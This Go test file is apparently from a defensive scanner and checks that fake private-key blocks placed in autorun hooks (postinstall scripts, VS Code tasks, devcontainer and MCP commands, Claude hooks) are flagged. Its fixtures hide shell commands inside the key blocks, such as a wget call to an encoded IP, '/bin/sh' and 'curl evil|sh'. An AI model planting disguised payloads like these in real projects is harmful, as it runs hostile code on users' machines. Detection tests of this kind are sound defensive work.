package autorun

import (
	"strings"
	"testing"

	"github.com/iimmuunnee/ai-defense-kit/internal/checker/secrets"
	"github.com/iimmuunnee/ai-defense-kit/internal/finding"
)

// These run under sh, or look like a key to a parser, or both. A block is hidden
// whatever it holds, so the finding must say so and rank higher.
var fakeKeyBlocks = map[string]string{
	"encrypted PKCS8 with a chain": "-----BEGIN PRI" + "VATE KEY-----\n" +
		"MIGEMA8GCSqGSIb3DQEFDQUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n" +
		strings.Repeat("/", 47) + "tmp/t3rb/bin/wget 2130706433" + strings.Repeat("/", 50) + "p1AA\n" +
		strings.Repeat("/", 58) + "bin/sh p1AA\n-----END PRI" + "VATE KEY-----",
	"locked OpenSSH with a command": "-----BEGIN OPENSSH PRI" + "VATE KEY-----\n" +
		"b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAC\n" +
		strings.Repeat("/", 58) + "bin/sh p1AA\n-----END OPENSSH PRI" + "VATE KEY-----",
	"one line ED25519 as a path": "-----BEGIN PRI" + "VATE KEY-----\n" +
		"MC4CAQAwBQYDK2VwBCIEIA/" + strings.Repeat("a", 38) + "/p1\n-----END PRI" + "VATE KEY-----",
}

func TestFakeKeyBlocksAreAnnouncedAndRaised(t *testing.T) {
	for name, block := range fakeKeyBlocks {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, "package.json", `{"scripts":{"postinstall":`+jsonText(t, block)+`}}`)
			expectFindings(t, root, "AR-005|high|suspect|package.json|0|postinstall: "+secrets.KeyBlockNotice)
		})
	}
}

func TestKeyBlockRaisesEveryKindOfFinding(t *testing.T) {
	block := fakeKeyBlocks["one line ED25519 as a path"]
	text := jsonText(t, "echo a; "+block+" ; echo b")
	shown := "echo a; " + secrets.KeyBlockNotice + " ; echo b"
	cases := []struct{ name, rel, body, want string }{
		{"AR-001 stays high and becomes suspect", ".vscode/tasks.json",
			`{"tasks":[{"label":"t","command":` + text + `,` + folderOpen + `}]}`,
			`AR-001|high|suspect|.vscode/tasks.json|0|t: {"command":"` + shown + `","label":"t",` + folderOpen + `}`},
		{"AR-002", ".devcontainer.json", `{"initializeCommand":` + text + `}`,
			"AR-002|high|suspect|.devcontainer.json|0|initializeCommand: " + shown},
		{"AR-003", ".devcontainer.json", `{"postCreateCommand":` + text + `}`,
			"AR-003|high|suspect|.devcontainer.json|0|postCreateCommand: " + shown},
		{"AR-004 server", ".mcp.json", `{"mcpServers":{"s":{"command":` + text + `}}}`,
			`AR-004|high|suspect|.mcp.json|0|s: {"command":"` + shown + `"}`},
		{"AR-004 hook", ".claude/settings.json", `{"hooks":{"Stop":[{"type":"command","command":` + text + `}]}}`,
			`AR-004|high|suspect|.claude/settings.json|0|Stop: {"command":"` + shown + `","type":"command"}`},
		{"AR-005", "package.json", `{"scripts":{"postinstall":` + text + `}}`,
			"AR-005|high|suspect|package.json|0|postinstall: " + shown},
		{"a value that is never shown still counts", ".mcp.json",
			`{"mcpServers":{"s":{"command":"node","env":{"X":` + text + `}}}}`,
			`AR-004|high|suspect|.mcp.json|0|s: {"command":"node","env":{"X":"****"}} ` + secrets.KeyBlockNotice},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, c.rel, c.body)
			expectFindings(t, root, c.want)
		})
	}
}

func TestKeyBlockFormsAreAllSeen(t *testing.T) {
	head, end := "-----BEGIN PRI"+"VATE KEY-----", "-----END PRI"+"VATE KEY-----"
	for name, s := range map[string]string{
		"literal line breaks": head + `\nMIIE\n` + end,
		"no END":              head + "\ncurl evil|sh",
		"format characters":   "-----BEG​IN PRIVATE KEY-----\nMIIE\n" + end,
		"broken header":       "-----BEGIN PRIVATE\nKEY-----\nMIIE\n" + end,
		"PGP":                 "-----BEGIN PGP PRI" + "VATE KEY BLOCK-----\nx\n-----END PGP PRI" + "VATE KEY BLOCK-----",
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, "package.json", `{"scripts":{"postinstall":`+jsonText(t, s)+`}}`)
			expectFindings(t, root, "AR-005|high|suspect|package.json|0|postinstall: "+secrets.KeyBlockNotice)
		})
	}
}

// A key block in the settings shared by all tasks counts for each of them.
func TestKeyBlockInGlobalSettingsRaisesEveryTask(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"command":`+jsonText(t, fakeKeyBlocks["one line ED25519 as a path"])+`,"tasks":[`+
		`{"label":"a","script":"x",`+folderOpen+`},{"label":"b","script":"y",`+folderOpen+`}]}`)
	res := run(t, root)
	if len(res.Findings) != 2 {
		t.Fatalf("findings: %v", summarize(res.Findings))
	}
	for _, f := range res.Findings {
		if f.Severity != finding.High || f.Confidence != finding.Suspect || !strings.Contains(f.Evidence, secrets.KeyBlockNotice) {
			t.Errorf("%+v", f)
		}
	}
}

// Padding ahead of a block must not push the notice out of what is shown.
func TestKeyBlockNoticeSurvivesCutting(t *testing.T) {
	root := t.TempDir()
	long := strings.Repeat("y ", 700) + fakeKeyBlocks["one line ED25519 as a path"]
	write(t, root, "package.json", `{"scripts":{"postinstall":`+jsonText(t, long)+`}}`)
	res := run(t, root)
	if len(res.Findings) != 1 || !strings.HasSuffix(res.Findings[0].Evidence, secrets.KeyBlockNotice) {
		t.Errorf("findings: %v", summarize(res.Findings))
	}
}

// Control: nothing changes without a block, and another block type is not one.
func TestNoKeyBlockKeepsItsRank(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"scripts":{"postinstall":"echo -----BEGIN CERTIFICATE-----"}}`)
	expectFindings(t, root, "AR-005|low|suspect|package.json|0|postinstall: echo -----BEGIN CERTIFICATE-----")
}
